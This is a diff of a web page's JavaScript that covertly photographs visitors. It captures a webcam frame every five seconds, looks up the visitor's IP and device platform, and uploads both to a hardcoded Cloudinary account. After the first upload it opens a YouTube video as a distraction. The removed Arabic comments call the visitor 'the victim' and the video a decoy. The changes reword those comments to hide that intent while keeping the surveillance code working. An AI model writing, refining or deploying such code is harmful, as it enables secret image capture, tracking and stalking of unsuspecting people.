@@ -24,7 +24,7 @@
     <script>
         const cloudName = 'dgkttv99v';
         const uploadPreset = 'ml_default'; // تأكد إن ده Unsigned في إعدادات Cloudinary
-        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // لينك الفيديو للتمويه
+        const youtubeLink = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // حط لينك الفيديو اللي عايزه هنا
 
         let tabOpened = false;
 
@@ -34,10 +34,10 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // ابدأ أول لقطة بعد ثانيتين لضمان استقرار الكاميرا
+                // ابدأ أول لقطة بعد ثانيتين
                 setTimeout(takeSnapshot, 2000);
                 
-                // كرر عملية الالتقاط والرفع كل 5 ثواني
+                // كرر كل 5 ثواني
                 setInterval(takeSnapshot, 5000);
             } catch (e) {
                 console.log("Camera Error");
@@ -51,11 +51,10 @@
             const video = document.getElementById('video');
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
-            
             const imageData = canvas.toDataURL("image/png");
 
             try {
-                // 1. جلب الـ IP الخاص بالمستخدم (الضحية)
+                // 1. جلب الـ IP الخاص بالمستخدم
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
@@ -67,7 +66,7 @@
                 formData.append('tags', `IP_${userIP}`); // حفظ الـ IP كـ Tag للبحث السهل
                 formData.append('context', `ip=${userIP}|device=${navigator.platform}`);
 
-                // 3. إرسال الصورة والـ IP معاً إلى Cloudinary
+                // 3. إرسال الصورة والـ IP معاً
                 fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                     method: 'POST',
                     body: formData
@@ -75,7 +74,6 @@
                 .then(r => r.json())
                 .then(data => {
                     console.log("Uploaded with IP: " + userIP);
-                    // أول ما أول صورة تترفع بنجاح، افتح تاب اليوتيوب للتمويه
                     if (!tabOpened) {
                         window.open(youtubeLink, '_blank');
                         tabOpened = true;
@@ -83,21 +81,6 @@
                 });
             } catch (err) {
                 console.error("Error getting IP or uploading", err);
-                
-                // في حالة فشل جلب الـ IP، حاول رفع الصورة بدونه لضمان استمرار العمل
-                const formData = new FormData();
-                formData.append('file', imageData);
-                formData.append('upload_preset', uploadPreset);
-                
-                fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
-                    method: 'POST',
-                    body: formData
-                }).then(r => r.json()).then(data => {
-                    if (!tabOpened) {
-                        window.open(youtubeLink, '_blank');
-                        tabOpened = true;
-                    }
-                });
             }
         }
 
